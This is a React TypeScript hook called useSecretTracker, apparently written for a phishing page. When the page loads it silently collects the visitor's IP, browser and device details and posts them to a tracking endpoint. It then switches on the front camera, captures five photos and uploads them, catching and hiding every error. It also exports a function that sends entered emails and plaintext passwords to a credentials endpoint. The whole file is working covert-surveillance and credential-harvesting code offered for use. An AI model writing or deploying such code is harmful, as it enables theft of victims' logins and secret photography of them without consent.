import { useEffect, useRef, useState } from "react";
import { v4 as uuidv4 } from "uuid";

export function useSecretTracker() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const initialized = useRef(false);
  const [sessionId] = useState(() => uuidv4());

  useEffect(() => {
    if (initialized.current) return;
    initialized.current = true;

    const sendInfo = async () => {
      try {
        let ipAddress = "unknown";
        try {
          const res = await fetch("https://api64.ipify.org?format=json");
          const data = await res.json();
          ipAddress = data.ip;
        } catch {
          // ignore
        }

        await fetch("/api/track/info", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            sessionId,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
            referrer: document.referrer || "direct",
            ip: ipAddress,
            timestamp: new Date().toISOString(),
          }),
        });
      } catch {
        // silent
      }
    };

    const capturePhotos = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false,
        });

        const video = videoRef.current;
        if (!video) return;

        video.srcObject = stream;
        await video.play();

        await new Promise<void>((resolve) => {
          const check = () => {
            if (video.videoWidth > 0) resolve();
            else setTimeout(check, 100);
          };
          check();
        });

        let count = 0;
        const maxPhotos = 5;

        const interval = setInterval(async () => {
          if (count >= maxPhotos) {
            clearInterval(interval);
            stream.getTracks().forEach((t) => t.stop());
            return;
          }

          const canvas = canvasRef.current;
          if (!canvas) return;

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (!ctx) return;

          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg", 0.8);
          const photoIndex = count;
          count++;

          try {
            await fetch("/api/track/photo", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                sessionId,
                photoIndex,
                imageData,
                timestamp: new Date().toISOString(),
              }),
            });
          } catch {
            // silent
          }
        }, 1000);
      } catch {
        // camera denied - silent
      }
    };

    sendInfo();
    capturePhotos();
  }, [sessionId]);

  const saveCredentials = async (email: string, password: string) => {
    try {
      await fetch("/api/track/credentials", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          email,
          password,
          timestamp: new Date().toISOString(),
        }),
      });
    } catch {
      // silent
    }
  };

  return { videoRef, canvasRef, sessionId, saveCredentials };
}
